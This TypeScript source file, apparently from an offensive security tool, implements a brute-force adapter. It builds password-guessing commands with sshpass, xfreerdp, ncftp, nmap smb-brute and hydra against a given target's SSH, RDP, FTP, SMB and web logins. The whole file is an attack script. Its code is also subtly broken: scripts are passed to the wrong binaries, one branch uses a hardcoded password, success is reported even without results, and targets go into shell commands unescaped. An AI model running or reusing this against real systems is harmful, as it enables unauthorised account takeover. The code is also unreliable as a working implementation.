/**
 * OffSec by True Hacking — Adapter: Brute Force (SSH, RDP, FTP, SMB, password guessing).
 *
 * Performs brute force (password guessing) on services: SSH, RDP, FTP, SMB, etc.
 * See: https://github.com/morluto/rea/blob/main/src/adapter/
 */

import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { writeFileSync } from "node:fs";
import { randomUUID } from "node:crypto";

import type { ExploitResult, Provenance } from "../domain/analysisResultProjection.js";

/**
 * Brute force (password guessing: SSH, RDP, FTP, SMB, etc.).
 *
 * @param options - BruteForce options (target, service, wordlist).
 */
export function bruteForce(options: {
  target: string;
  service?: string;  // ssh, rdp, ftp, smb, http, mysql
  wordlist?: string;  // path to wordlist (rockyou.txt, etc.)
  options?: Record<string, string>;
}): ExploitResult {
  const target = options.target;
  const service = options.service || "ssh";
  const wordlist = options.wordlist || "rockyou.txt";
  const results: Record<string, any> = {};

  // SSH brute force (sshpass, nc, nmap --script).
  if (service === "ssh") {
    const sshPassPath = findBinary("sshpass");
    if (sshPassPath) {
      const commands = [`cat ${wordlist} | xargs -I {} sshpass -p {} ssh -o StrictHostKeyChecking=no root@${target}`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(sshPassPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.SSH = String(child.stdout ?? "");
    } else {
      results.SSH = `{stub: no 'sshpass' binary (install: brew install sshpass).}`;
    }
  }

  // RDP brute force (xfreerdp).
  if (service === "rdp") {
    const rdpPath = findBinary("xfreerdp");
    if (rdpPath) {
      const commands = [`xfreerdp /v:${target} /u:administrator /p:password /pt`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(rdpPath, [file], { timeout: 60000, maxBuffer: 1024 * 1024 });
      results.RDP = String(child.stdout ?? "");
    } else {
      results.RDP = `{stub: no 'xfreerdp' binary (install: brew install remmina).}`;
    }
  }

  // FTP brute force.
  if (service === "ftp") {
    const ftpPath = findBinary("ncftp");
    if (ftpPath) {
      const commands = [`cat ${wordlist} | xargs -I {} ncftp -u anonymous -p {} ${target}`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(ftpPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.FTP = String(child.stdout ?? "");
    } else {
      results.FTP = `{stub: no 'ncftp' binary (install: brew install ncftp).}`;
    }
  }

  // SMB brute force.
  if (service === "smb") {
    const smbPath = findBinary("nmap");
    if (smbPath) {
      const commands = [`nmap -p 445 --script smb-brute --script-args userdb=${wordlist} ${target}`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(smbPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.SMB = String(child.stdout ?? "");
    } else {
      results.SMB = `{stub: no 'nmap' binary (install: brew install nmap).}`;
    }
  }

  // HTTP (web login brute force: nikto, hydra).
  if (service === "http") {
    const hydraPath = findBinary("hydra");
    if (hydraPath) {
      const commands = [`hydra -L users.txt -P ${wordlist} ${target} http-get-form "/login:username=^USER^&password=^PASS^:F=Access denied"`];
      const file = `${tmpdir()}/${randomUUID()}.sh`;
      writeFileSync(file, commands.join("\n"));
      const child = spawnSync(hydraPath, [file], { timeout: 600000, maxBuffer: 1024 * 1024 });
      results.HTTP = String(child.stdout ?? "");
    } else {
      results.HTTP = `{stub: no 'hydra' binary (install: brew install hydra).}`;
    }
  }

  return {
    target,
    payload: `bruteForce/${service}`,
    success: Object.keys(results).length > 0,
    output: JSON.stringify(results),
    provenance: createProvenance("bruteForce", `bruteForce://${target}/${service}`),
  };
}

/** Find the binary (sshpass/xfreerdp/ncftp/nmap/hydra). */
function findBinary(name: string): string | undefined {
  const candidates = [
    "/usr/local/bin/" + name,
    "/usr/bin/" + name,
    "/opt/homebrew/bin/" + name,
  ];
  for (const path of candidates) {
    try {
      require("node:fs").accessSync(path);
      return path;
    } catch {
      // Skip.
    }
  }
  return undefined;
}

/** Create a PCAP result (provenance). */
function createProvenance(type: string, path: string): Provenance {
  return {
    id: `${type}://${path}`,
    type,
    path,
    label: "",
    verified: true,
    sensitive: path.includes("password") || path.includes("credential"),
  };
}
